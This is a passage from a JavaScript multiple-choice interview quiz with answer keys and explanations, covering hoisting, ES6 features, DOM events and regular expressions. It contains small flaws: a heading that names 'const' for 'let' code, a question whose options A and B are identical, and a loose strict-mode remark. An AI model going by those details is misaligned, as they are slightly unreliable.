  function inner() { return 'inner result'; }
}
outer();
```

- A) `ReferenceError: inner is not defined`
- B) `"inner result"`
- C) `undefined`
- D) `TypeError: inner is not a function`

**Answer: B) `"inner result"`**

**Explanation:** Function declarations are fully hoisted within their containing function scope. `inner` is defined as a function declaration, so it is hoisted to the top of `outer()`\'s scope. It can be called before its declaration line. This is different from function expressions, which are NOT hoisted.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of hoisting with `const` inside a block?

```javascript
{
  console.log(typeof blockLet);
  let blockLet = 'hello';
}
console.log(typeof blockLet);
```

- A) `"undefined"`, `"string"`
- B) `ReferenceError`, then `"undefined"`
- C) `"string"`, `"undefined"`
- D) `"undefined"`, `"undefined"`

**Answer: B) `ReferenceError`, then `"undefined"`**

**Explanation:** Inside the block, `blockLet` is in the TDZ before its declaration — accessing it throws `ReferenceError`. The second `typeof blockLet` is outside the block where `blockLet` doesn\'t exist at all. `typeof` on an undeclared name safely returns `"undefined"` without throwing.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of a function expression versus declaration used before definition?

```javascript
try { console.log(expr()); } catch (e) { console.log('expr error'); }
try { console.log(decl()); } catch (e) { console.log('decl error'); }

var expr = function() { return 'expression'; };
function decl() { return 'declaration'; }
```

- A) `"expression"`, `"declaration"`
- B) `"expr error"`, `"declaration"`
- C) `"expr error"`, `"decl error"`
- D) `"expression"`, `"decl error"`

**Answer: B) `"expr error"`, `"declaration"`**

**Explanation:** `var expr` is hoisted as `undefined`, so calling `expr()` throws `TypeError: expr is not a function`. The `decl` function declaration is fully hoisted — it can be called before its position in the code. This is the key difference between the two syntax forms.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of `var` hoisting across if-else blocks?

```javascript
function test(flag) {
  if (flag) {
    var result = 'true branch';
  } else {
    var result = 'false branch';
  }
  return result;
}
console.log(test(true));
console.log(test(false));
```

- A) `"true branch"`, `ReferenceError`
- B) `"true branch"`, `"false branch"`
- C) `undefined`, `undefined`
- D) `"true branch"`, `undefined`

**Answer: B) `"true branch"`, `"false branch"`**

**Explanation:** `var` is function-scoped — the `result` declared in both branches is the **same** variable, hoisted to the top of `test()`. Whichever branch executes assigns the value. With `let`, both would be block-scoped to their respective `if`/`else` blocks, but the function-level `result` would be inaccessible (causing `ReferenceError`).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 10. ES6 Features

<br>

## Q. A developer uses destructuring. What is the output?

```javascript
const [a, , b, c = 99] = [10, 20, 30];
console.log(a, b, c);
```

- A) `10`, `20`, `30`
- B) `10`, `30`, `99`
- C) `10`, `30`, `undefined`
- D) `10`, `20`, `99`

**Answer: B) `10`, `30`, `99`**

**Explanation:** The second element (`20`) is skipped using an empty slot. `b` captures `30`. `c` has a default of `99` and since there is no fourth element, it uses the default.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does this template literal and tagged template return?

```javascript
const name = "World";
const greeting = `Hello, ${name.toUpperCase()}! ${2 + 2} items.`;
console.log(greeting);
```

- A) `"Hello, ${name.toUpperCase()}! ${2 + 2} items."`
- B) `"Hello, World! 4 items."`
- C) `"Hello, WORLD! 4 items."`
- D) `SyntaxError`

**Answer: C) `"Hello, WORLD! 4 items."`**

**Explanation:** Template literals evaluate expressions inside `${}`. `name.toUpperCase()` produces `"WORLD"` and `2 + 2` evaluates to `4`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer converts a function to an arrow function. What is the key behavioral difference?

```javascript
const obj = {
  value: 42,
  regular: function() { return this.value; },
  arrow: () => this.value
};

console.log(obj.regular());
console.log(obj.arrow());
```

- A) `42`, `42`
- B) `42`, `undefined`
- C) `undefined`, `42`
- D) Both throw `TypeError`

**Answer: B) `42`, `undefined`**

**Explanation:** Regular functions get their own `this` based on how they are called. When `obj.regular()` is called, `this` is `obj`, so it returns `42`. Arrow functions inherit `this` from the surrounding lexical scope. Since this object literal is in the global scope, `this.value` is `undefined` (or throws in strict mode).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of this spread/rest example?

```javascript
function sum(...nums) {
  return nums.reduce((acc, n) => acc + n, 0);
}

const values = [1, 2, 3];
console.log(sum(...values, 4, 5));
```

- A) `[1, 2, 3, 4, 5]`
- B) `15`
- C) `10`
- D) `TypeError`

**Answer: B) `15`**

**Explanation:** The spread operator `...values` expands the array into individual arguments. Combined with `4` and `5`, `sum` receives `1, 2, 3, 4, 5`. The rest parameter `...nums` collects all arguments into an array. `reduce` sums them to `15`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does object destructuring with renaming and defaults produce?

```javascript
const { name: firstName, age = 18, country = 'US' } = { name: 'Alice', age: 25 };
console.log(firstName, age, country);
console.log(typeof name);
```

- A) `"Alice"` `25` `"US"`, `"string"`
- B) `"Alice"` `25` `"US"`, `"undefined"`
- C) `undefined` `25` `"US"`, `"string"`
- D) `"Alice"` `18` `"US"`, `"undefined"`

**Answer: B) `"Alice"` `25` `"US"`, `"undefined"`**

**Explanation:** `name: firstName` renames `name` to `firstName`. `age = 18` defaults only if `age` is `undefined` — since it\'s `25`, the default is not used. `country` is not in the source object, so it defaults to `'US'`. The variable `name` is never created → `typeof name` is `"undefined"`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `Map` return compared to a plain object?

```javascript
const map = new Map();
map.set('a', 1);
map.set(1, 'one');
map.set(true, 'bool');
console.log(map.size);
console.log(map.get(1));
console.log(map.has(true));
for (const [key, val] of map) {
  console.log(typeof key);
}
```

- A) `3`, `"one"`, `true`, `"string"`, `"string"`, `"string"`
- B) `3`, `"one"`, `true`, `"string"`, `"number"`, `"boolean"`
- C) `3`, `1`, `true`, `"string"`, `"number"`, `"boolean"`
- D) `2`, `"one"`, `false`, `"string"`, `"number"`, `"boolean"`

**Answer: B) `3`, `"one"`, `true`, `"string"`, `"number"`, `"boolean"`**

**Explanation:** Unlike plain objects (where keys are always strings/Symbols), `Map` can use any value as a key: strings, numbers, booleans, objects, etc. `map.size` gives the count. Iterating with `for...of` yields `[key, value]` pairs in insertion order, preserving key types.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a `Set` produce?

```javascript
const set = new Set([1, 2, 2, 3, 3, 3]);
console.log(set.size);
set.add(4);
set.add(2);
console.log(set.size);
console.log([...set]);
```

- A) `3`, `4`, `[1,2,3,4]`
- B) `6`, `7`, `[1,2,2,3,3,3,4,2]`
- C) `3`, `4`, `[1,2,3,4,2]`
- D) `3`, `5`, `[1,2,3,4,2]`

**Answer: A) `3`, `4`, `[1,2,3,4]`**

**Explanation:** A `Set` stores only unique values — duplicates are silently ignored. `new Set([1,2,2,3,3,3])` has size `3`. Adding `4` increases size to `4`. Adding `2` again (already exists) does not change the set. Spreading the Set gives `[1,2,3,4]` in insertion order.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a tagged template literal receive?

```javascript
function tag(strings, ...values) {
  return strings.raw[0] + values[0] + strings.raw[1];
}
const name = 'World';
const result = tag`Hello\n${name}!`;
console.log(result);
```

- A) `"Hello\nWorld!"`
- B) `"Hello\\nWorld!"`
- C) `"HelloWorld"`
- D) `SyntaxError`

**Answer: B) `"Hello\\nWorld!"`**

**Explanation:** Tagged templates receive a `strings` array where `strings.raw` preserves escape sequences as-is (raw strings). `strings.raw[0]` is `"Hello\\n"` (literal backslash-n, not a newline). `values[0]` is `"World"`. `strings.raw[1]` is `"!"`. Result: `"Hello\\nWorld!"`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a generator function produce?

```javascript
function* range(start, end) {
  for (let i = start; i <= end; i++) {
    yield i;
  }
}
const gen = range(1, 3);
console.log(gen.next());
console.log(gen.next());
console.log(gen.next());
console.log(gen.next());
```

- A) `{value:1,done:false}`, `{value:2,done:false}`, `{value:3,done:false}`, `{value:undefined,done:true}`
- B) `1`, `2`, `3`, `undefined`
- C) `{value:1,done:true}`, `{value:2,done:true}`, `{value:3,done:true}`, `{value:undefined,done:false}`
- D) `{value:1,done:false}`, `{value:2,done:false}`, `{value:3,done:true}`, `{value:undefined,done:true}`

**Answer: A) `{value:1,done:false}`, `{value:2,done:false}`, `{value:3,done:false}`, `{value:undefined,done:true}`**

**Explanation:** Generators are lazy iterators. Each `next()` call runs until the next `yield`, returning `{value, done}`. `done: false` while values remain, `done: true` after the last yield. The final `next()` returns `{value: undefined, done: true}`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does object shorthand and computed properties produce?

```javascript
const key = 'dynamic';
const value = 42;
const obj = {
  key,
  value,
  [key + 'Key']: true,
  greet() { return 'hello'; }
};
console.log(obj.key, obj.value, obj.dynamicKey, obj.greet());
```

- A) `"key"`, `42`, `undefined`, `"hello"`
- B) `"key"`, `42`, `true`, `"hello"`
- C) `"dynamic"`, `42`, `true`, `"hello"`
- D) `"dynamic"`, `42`, `undefined`, `"hello"`

**Answer: C) `"dynamic"`, `42`, `true`, `"hello"`**

**Explanation:** Property shorthand `{ key }` is `{ key: key }` where `key = 'dynamic'` → property named `key` with value `'dynamic'`. Similarly `{ value }` → `{ value: 42 }`. Computed property `[key + 'Key']` evaluates to `'dynamicKey'`. Method shorthand `greet()` creates a method.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the `WeakMap` guarantee?

```javascript
let obj = { data: 'private' };
const weakMap = new WeakMap();
weakMap.set(obj, 'metadata');
console.log(weakMap.has(obj));
obj = null; // obj is garbage collectable
console.log(weakMap.size);
```

- A) `true`, `0`
- B) `true`, `1`
- C) `true`, `undefined` — WeakMap has no `size` property
- D) `false`, `undefined`

**Answer: C) `true`, `undefined` — WeakMap has no `size` property**

**Explanation:** `WeakMap` holds **weak references** to its keys — if the key object has no other references, it can be garbage collected. `weakMap.has(obj)` → `true`. `weakMap.size` is `undefined` — `WeakMap` deliberately has no `size` property (and is not iterable) because the entries may disappear at any time due to GC.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `for...of` with destructuring on a `Map` produce?

```javascript
const scores = new Map([
  ['Alice', 95],
  ['Bob', 82],
  ['Carol', 78]
]);
const names = [];
for (const [name, score] of scores) {
  if (score >= 80) names.push(name);
}
console.log(names);
```

- A) `["Alice", "Bob", "Carol"]`
- B) `["Alice", "Bob"]`
- C) `["Alice"]`
- D) `[]`

**Answer: B) `["Alice", "Bob"]`**

**Explanation:** `for...of` on a `Map` yields `[key, value]` pairs in insertion order. Destructuring `[name, score]` unpacks each pair. Alice (95 ≥ 80) and Bob (82 ≥ 80) are included. Carol (78 < 80) is excluded. `Map.forEach` or `for...of` are the idiomatic ways to iterate Maps.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the `Symbol.iterator` protocol produce?

```javascript
const range = {
  from: 1,
  to: 3,
  [Symbol.iterator]() {
    let current = this.from;
    const last = this.to;
    return {
      next() {
        return current <= last
          ? { value: current++, done: false }
          : { value: undefined, done: true };
      }
    };
  }
};
console.log([...range]);
```

- A) `[]`
- B) `[1, 2, 3]`
- C) `[0, 1, 2, 3]`
- D) `TypeError: range is not iterable`

**Answer: B) `[1, 2, 3]`**

**Explanation:** An object is iterable if it implements `Symbol.iterator` — a method that returns an iterator object with a `next()` method. The spread operator and `for...of` use this protocol. Here, the iterator yields `1, 2, 3` and signals completion with `done: true`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the nullish coalescing assignment `??=` do?

```javascript
let a = null;
let b = undefined;
let c = 0;
let d = '';
a ??= 'default-a';
b ??= 'default-b';
c ??= 'default-c';
d ??= 'default-d';
console.log(a, b, c, d);
```

- A) `"default-a"`, `"default-b"`, `"default-c"`, `"default-d"`
- B) `"default-a"`, `"default-b"`, `0`, `""`
- C) `"default-a"`, `"default-b"`, `0`, `"default-d"`
- D) `"default-a"`, `"default-b"`, `"default-c"`, `""`

**Answer: B) `"default-a"`, `"default-b"`, `0`, `""`**

**Explanation:** `??=` (nullish assignment) only assigns if the left side is `null` or `undefined`. `a = null` and `b = undefined` are nullish → assigned. `c = 0` and `d = ''` are **not** nullish (they have values, even falsy ones) → not assigned. This differs from `||=` which assigns for any falsy value.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 11. DOM & Events

<br>

## Q. A developer attaches event listeners with `addEventListener`. What is logged when the button is clicked?

```javascript
const btn = document.querySelector("#btn");

btn.addEventListener("click", function() {
  console.log("listener 1");
});

btn.addEventListener("click", function() {
  console.log("listener 2");
});
```

- A) Only `"listener 2"` — second listener overwrites the first
- B) `"listener 1"` then `"listener 2"` — both fire
- C) `"listener 1"` only — first listener takes priority
- D) Neither fires — duplicate event type causes an error

**Answer: B) `"listener 1"` then `"listener 2"` — both fire**

**Explanation:** Unlike `onclick = fn`, which allows only one handler, `addEventListener` registers multiple listeners for the same event type. Both execute in the order they were registered.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer has nested elements with click handlers. What is the console output when the inner `<div>` is clicked?

```javascript
document.getElementById("outer").addEventListener("click", () => console.log("outer"));
document.getElementById("inner").addEventListener("click", () => console.log("inner"));
```

HTML: `<div id="outer"><div id="inner">Click me</div></div>`

- A) `"outer"` only
- B) `"inner"` only
- C) `"inner"` then `"outer"` — event bubbles up
- D) `"outer"` then `"inner"` — event captures down

**Answer: C) `"inner"` then `"outer"` — event bubbles up**

**Explanation:** By default, `addEventListener` uses the **bubbling phase**. The event fires on the target (`"inner"`) first, then bubbles up to ancestors. To use capturing (top-down), pass `{ capture: true }` as the third argument.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer calls `event.stopPropagation()`. What happens?

```javascript
document.getElementById("outer").addEventListener("click", () => console.log("outer"));
document.getElementById("inner").addEventListener("click", (e) => {
  e.stopPropagation();
  console.log("inner");
});
// User clicks inner div
```

- A) Both `"inner"` and `"outer"` are logged
- B) Only `"inner"` is logged — propagation is stopped
- C) Only `"outer"` is logged — inner is prevented
- D) Neither is logged — stop propagation prevents all handlers

**Answer: B) Only `"inner"` is logged — propagation is stopped**

**Explanation:** `stopPropagation()` stops the event from bubbling up to parent elements. The inner handler runs, but the outer handler never fires. Compare with `stopImmediatePropagation()` which additionally prevents other listeners on the **same** element from running.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is event delegation and how does it work?

```javascript
document.getElementById("list").addEventListener("click", function(e) {
  if (e.target.tagName === "LI") {
    console.log("Clicked:", e.target.textContent);
  }
});
```

HTML:
```html
<ul id="list">
  <li>Item 1</li>
  <li>Item 2</li>
</ul>
```

- A) This requires separate click listeners on each `<li>` — the above doesn\'t work
- B) This uses event delegation — one listener on the parent handles clicks on all children via bubbling
- C) This only works for the first `<li>` element
- D) `e.target` always refers to the `<ul>`, not the clicked `<li>`

**Answer: B) This uses event delegation — one listener on the parent handles clicks on all children via bubbling**

**Explanation:** Event delegation attaches a single listener to a parent element and uses `e.target` to identify which child was clicked. Since events bubble, clicks on `<li>` elements bubble up to the `<ul>`. This is more efficient (one listener vs. many) and automatically handles dynamically added children.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the difference between `event.target` and `event.currentTarget`?

```javascript
document.getElementById("outer").addEventListener("click", function(e) {
  console.log("target:", e.target.id);
  console.log("currentTarget:", e.currentTarget.id);
});
// User clicks the inner div (id="inner") inside the outer div
```

- A) Both log `"outer"`
- B) Both log `"inner"`
- C) `e.target` → `"inner"`, `e.currentTarget` → `"outer"`
- D) `e.target` → `"outer"`, `e.currentTarget` → `"inner"`

**Answer: C) `e.target` → `"inner"`, `e.currentTarget` → `"outer"`**

**Explanation:** `e.target` is the element that **triggered** the event (the innermost clicked element). `e.currentTarget` is the element the listener is **attached to**. During bubbling, `currentTarget` changes with each handler, while `target` always remains the original element that was clicked.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `addEventListener` with the `once` option do?

```javascript
let count = 0;
document.getElementById("btn").addEventListener("click", () => {
  count++;
}, { once: true });
// Button is clicked 3 times
console.log(count); // after 3 clicks
```

- A) `3` — `once: true` has no effect
- B) `1` — the handler fires only once then auto-removes itself
- C) `0` — `once: true` prevents the handler from firing
- D) `2` — the handler fires twice then stops

**Answer: B) `1` — the handler fires only once then auto-removes itself**

**Explanation:** The `{ once: true }` option automatically removes the event listener after it fires for the first time. This is equivalent to calling `removeEventListener` inside the handler, but cleaner. Useful for one-time initialization or single-use dialogs.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `preventDefault()` do on a form submit event?

```javascript
document.getElementById("form").addEventListener("submit", function(e) {
  e.preventDefault();
  console.log("Form submitted via JavaScript");
  // Validate and send via fetch() instead
});
```

- A) Stops the event from bubbling to parent elements
- B) Prevents the browser\'s default behavior (page reload/navigation) without stopping propagation
- C) Removes all other submit handlers on this form
- D) Prevents JavaScript form validation from running

**Answer: B) Prevents the browser\'s default behavior (page reload/navigation) without stopping propagation**

**Explanation:** `preventDefault()` stops the browser's default action for the event (like form submission causing a page reload, or link navigation). It does **not** stop propagation — other listeners still fire. Use it to implement custom form handling with `fetch()` or AJAX.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `DOMContentLoaded` fire compared to `load`?

```javascript
document.addEventListener("DOMContentLoaded", () => console.log("DOM ready"));
window.addEventListener("load", () => console.log("All resources loaded"));
```

- A) Both fire at the same time
- B) `DOMContentLoaded` fires when the HTML is parsed; `load` fires after all images and stylesheets also load
- C) `load` fires first, then `DOMContentLoaded`
- D) `DOMContentLoaded` fires only after `load`

**Answer: B) `DOMContentLoaded` fires when the HTML is parsed; `load` fires after all images and stylesheets also load**

**Explanation:** `DOMContentLoaded` fires when the HTML is fully parsed and the DOM is ready, without waiting for stylesheets, images, or subframes. `load` fires after **all** resources (images, CSS, fonts) have finished loading. For DOM manipulation, use `DOMContentLoaded`; for resource-dependent operations, use `load`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How does `CustomEvent` work?

```javascript
const event = new CustomEvent('orderPlaced', {
  detail: { orderId: 123, total: 99.99 },
  bubbles: true
});
document.getElementById("app").addEventListener("orderPlaced", (e) => {
  console.log("Order:", e.detail.orderId, "Total:", e.detail.total);
});
document.getElementById("checkout").dispatchEvent(event);
```

- A) `CustomEvent` only works for built-in event types
- B) The handler never fires because custom events don\'t bubble by default
- C) Logs `"Order: 123 Total: 99.99"` — the custom event bubbles up to `#app` with the detail payload
- D) Throws `TypeError: CustomEvent is not a constructor`

**Answer: C) Logs `"Order: 123 Total: 99.99"` — the custom event bubbles up to `#app` with the detail payload**

**Explanation:** `CustomEvent` allows creating arbitrary events with a `detail` payload. `bubbles: true` means the event bubbles up from `#checkout` to `#app`. This enables decoupled communication between components without tight coupling, similar to a pub/sub pattern.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a `MutationObserver` detect?

```javascript
const observer = new MutationObserver((mutations) => {
  mutations.forEach(m => console.log(m.type, m.addedNodes.length));
});
observer.observe(document.getElementById("container"), {
  childList: true,
  subtree: true
});
// Later: document.getElementById("container").appendChild(div);
```

- A) Only CSS changes on the observed element
- B) DOM additions/removals in the observed element and its descendants
- C) Attribute changes only (like `class` or `data-*`)
- D) Only text content changes

**Answer: B) DOM additions/removals in the observed element and its descendants**

**Explanation:** `MutationObserver` detects DOM changes asynchronously. `childList: true` monitors child node additions/removals. `subtree: true` extends monitoring to all descendants. When a `div` is appended, the callback fires with `m.type = 'childList'` and `m.addedNodes.length = 1`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `passive: true` in `addEventListener` options do?

```javascript
window.addEventListener("scroll", handler, { passive: true });
```

- A) Makes the listener fire only once
- B) Prevents `preventDefault()` from working, but allows the browser to optimize scrolling
- C) Makes the listener run in a Web Worker thread
- D) Prevents the event from bubbling

**Answer: B) Prevents `preventDefault()` from working, but allows the browser to optimize scrolling**

**Explanation:** Passive event listeners tell the browser that the handler will **not** call `preventDefault()`. This allows the browser to start scrolling immediately without waiting for the JavaScript handler to complete. Marking scroll/touchmove handlers as `passive: true` significantly improves scroll performance on mobile.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the difference between `removeEventListener` with and without a reference?

```javascript
const btn = document.getElementById("btn");

// Attempt 1 — anonymous function
btn.addEventListener("click", () => console.log("click"));
btn.removeEventListener("click", () => console.log("click")); // Does this work?

// Attempt 2 — named reference
const handler = () => console.log("click");
btn.addEventListener("click", handler);
btn.removeEventListener("click", handler); // Does this work?
```

- A) Both removals work
- B) Neither removal works
- C) Only Attempt 1 works
- D) Only Attempt 2 works — same reference is required for removal

**Answer: D) Only Attempt 2 works — same reference is required for removal**

**Explanation:** `removeEventListener` requires the **exact same function reference** used in `addEventListener`. Each arrow function expression creates a new object — two identical-looking anonymous functions are different references. Only when the same variable (`handler`) is used for both add and remove does removal succeed.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `requestAnimationFrame` guarantee about timing?

```javascript
let frame = 0;
function animate() {
  frame++;
  if (frame < 3) requestAnimationFrame(animate);
  else console.log("done after", frame, "frames");
}
requestAnimationFrame(animate);
```

- A) The callback fires every 16.67ms regardless of display refresh rate
- B) The callback fires before the next browser repaint, synchronized with the display refresh rate
- C) The callback fires immediately on the next microtask
- D) The callback fires after 100ms delay

**Answer: B) The callback fires before the next browser repaint, synchronized with the display refresh rate**

**Explanation:** `requestAnimationFrame` schedules callbacks to run before the next browser repaint, synchronized to the display\'s refresh rate (typically 60fps → ~16.67ms). This ensures smooth animations without tearing. Unlike `setTimeout`, it automatically pauses in hidden tabs to save battery.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 12. Regular Expressions

<br>

## Q. A developer validates an email-like pattern. What does the following return?

```javascript
const pattern = /^[a-zA-Z0-9]+@[a-zA-Z]+\.[a-zA-Z]{2,}$/;
console.log(pattern.test("user@example.com"));
console.log(pattern.test("user @example.com"));
console.log(pattern.test("user@.com"));
```

- A) `true`, `true`, `true`
- B) `true`, `false`, `false`
- C) `true`, `true`, `false`
- D) `false`, `false`, `true`

**Answer: B) `true`, `false`, `false`**

**Explanation:** The first matches the pattern. The second has a space (not in `[a-zA-Z0-9]+`), so it fails. The third has no domain name before `.com` (`[a-zA-Z]+` requires at least one letter), so it fails.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `.replace()` with a regex return?

```javascript
const str = "foo bar foo baz foo";
console.log(str.replace(/foo/, "qux"));
console.log(str.replace(/foo/g, "qux"));
```

- A) `"qux bar foo baz foo"`, `"qux bar qux baz qux"`
- B) `"qux bar qux baz qux"`, `"qux bar qux baz qux"`
- C) `"qux bar foo baz foo"`, `"qux bar foo baz foo"`
- D) Both return `"qux bar foo baz foo"`

**Answer: A) `"qux bar foo baz foo"`, `"qux bar qux baz qux"`**

**Explanation:** Without the `g` (global) flag, `.replace()` only replaces the **first** occurrence. With `/g`, all occurrences are replaced.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What do named capture groups return?

```javascript
const dateStr = '2024-05-15';
const pattern = /(?<year>\d{4})-(?<month>\d{2})-(?<day>\d{2})/;
const match = dateStr.match(pattern);
console.log(match.groups.year);
console.log(match.groups.month);
console.log(match.groups.day);
```

- A) `"2024"`, `"05"`, `"15"`
- B) `undefined`, `undefined`, `undefined`
- C) `["2024","05","15"]`
- D) `"2024-05-15"`

**Answer: A) `"2024"`, `"05"`, `"15"`**

**Explanation:** Named capture groups use the `(?<name>...)` syntax. The `match()` result includes a `groups` object where each named group maps to its captured value. This is more readable than positional groups (`match[1]`, `match[2]`). Named groups work with destructuring: `const { year, month, day } = dateStr.match(pattern).groups`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a lookahead assertion match?

```javascript
const prices = ['$10', '$20', '€30', '$40'];
const dollarAmounts = prices.filter(p => /(?<=\$)\d+/.test(p));
const dollarValues = '$100 €50 $200'.match(/\d+(?= dollars|\$)/g);
console.log(dollarAmounts);
```

- A) `['$10', '$20', '$40']`
- B) `['10', '20', '40']`
- C) `['€30']`
- D) `[]`

**Answer: A) `['$10', '$20', '$40']`**

**Explanation:** `/(?<=\$)\d+/` uses a **lookbehind** — it matches digits preceded by `$` without including `$` in the match. `test()` returns true for strings containing those digits. `filter` returns the original strings (`'$10'`, `'$20'`, `'$40'`), not just the digit portions.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `exec` with the global flag return on repeated calls?

```javascript
const regex = /\d+/g;
const str = 'abc 123 def 456 ghi 789';
let match;
const results = [];
while ((match = regex.exec(str)) !== null) {
  results.push(match[0]);
}
console.log(results);
```

- A) `["123"]`
- B) `["123", "456", "789"]`
- C) `["123", "456", "789", null]`
- D) Infinite loop

**Answer: B) `["123", "456", "789"]`**

**Explanation:** With the `g` flag, `regex.exec()` remembers its position via `regex.lastIndex`. Each call finds the next match. When no more matches exist, it returns `null` and resets `lastIndex` to 0. The `while` loop collects all three numbers.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `replace` with a callback function return?

```javascript
const result = 'hello world'.replace(/\b\w/g, char => char.toUpperCase());
console.log(result);
```

- A) `"HELLO WORLD"`
- B) `"Hello World"`
- C) `"Hello world"`
- D) `"hello World"`

**Answer: B) `"Hello World"`**

**Explanation:** When the second argument to `replace` is a function, it\'s called for each match. The function receives the matched string (and optionally capture groups, offset, and original string) and returns the replacement. `\b\w` matches the first character of each word. `toUpperCase()` capitalizes it.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the difference between greedy and non-greedy matching?

```javascript
const html = '<b>bold</b> and <i>italic</i>';
const greedy = html.match(/<.+>/);
const lazy = html.match(/<.+?>/);
console.log(greedy[0]);
console.log(lazy[0]);
```

- A) `"<b>"`, `"<b>"`
- B) `"<b>bold</b> and <i>italic</i>"`, `"<b>"`
- C) `"<b>"`, `"<i>"`
- D) `"<b>bold</b> and <i>italic</i>"`, `"<b>bold</b>"`

**Answer: B) `"<b>bold</b> and <i>italic</i>"`, `"<b>"`**

**Explanation:** Greedy `.+` matches as much as possible → matches everything from the first `<` to the last `>`. Non-greedy `.+?` matches as little as possible → stops at the first `>`, capturing `"<b>"`. Add `?` after quantifiers (`*?`, `+?`, `{n,m}?`) to make them non-greedy.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `String.matchAll` return?

```javascript
const str = 'test1 test2 test3';
const matches = [...str.matchAll(/test(\d)/g)];
console.log(matches.length);
console.log(matches[0][0], matches[0][1]);
console.log(matches[2][0], matches[2][1]);
```

- A) `3`, `"test1"` `"1"`, `"test3"` `"3"`
- B) `1`, `"test1"` `"1"`, `undefined` `undefined`
- C) `3`, `"test1"` `undefined`, `"test3"` `undefined`
- D) `["test1","test2","test3"]`

**Answer: A) `3`, `"test1"` `"1"`, `"test3"` `"3"`**

**Explanation:** `matchAll` returns an iterator of all match objects including capture groups. Unlike `match(/g/)` which returns only matched strings, each entry in `matchAll` contains the full match info: `[0]` is the full match, `[1]` is the first capture group. Requires the `g` flag.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the `\b` word boundary assertion match?

```javascript
const str = 'cat concatenate catfish category';
console.log(str.match(/\bcat\b/g));
console.log(str.match(/cat/g));
```

- A) `["cat"]`, `["cat","cat","cat","cat"]`
- B) `["cat"]`, `["cat","cat","cat","cat"]`
- C) `null`, `["cat","cat","cat","cat"]`
- D) `["cat","cat"]`, `["cat","cat","cat","cat"]`

**Answer: A) `["cat"]`, `["cat","cat","cat","cat"]`**

**Explanation:** `\b` matches a word boundary (transition between a word character and a non-word character). `/\bcat\b/g` only matches the standalone word `"cat"`. Without `\b`, `/cat/g` matches `"cat"` everywhere it appears: in `cat`, `concatenate`, `catfish`, and `category`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `split` with a regex capture group return?

```javascript
const str = 'one1two2three3four';
console.log(str.split(/(\d)/));
console.log(str.split(/\d/));
```

- A) `["one","1","two","2","three","3","four"]`, `["one","two","three","four"]`
- B) `["one","two","three","four"]`, `["one","two","three","four"]`
- C) `["one1","two2","three3","four"]`, `["one","two","three","four"]`
- D) `["one","1","two","2","three","3","four"]`, `["one1","two2","three3","four"]`

**Answer: A) `["one","1","two","2","three","3","four"]`, `["one","two","three","four"]`**

**Explanation:** When `split` is given a regex with a **capture group**, the captured portions are included in the result array. `split(/(\d)/)` includes the digits as separate elements. `split(/\d/)` (no capture group) splits on digits but discards them.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the `i` (case-insensitive) and `m` (multiline) flag do?

```javascript
const text = 'Hello\nhello\nHELLO';
console.log(text.match(/hello/gi).length);
console.log(text.match(/^hello/gim).length);
```

- A) `3`, `1`
- B) `3`, `3`
- C) `1`, `3`
- D) `3`, `2`

**Answer: B) `3`, `3`**

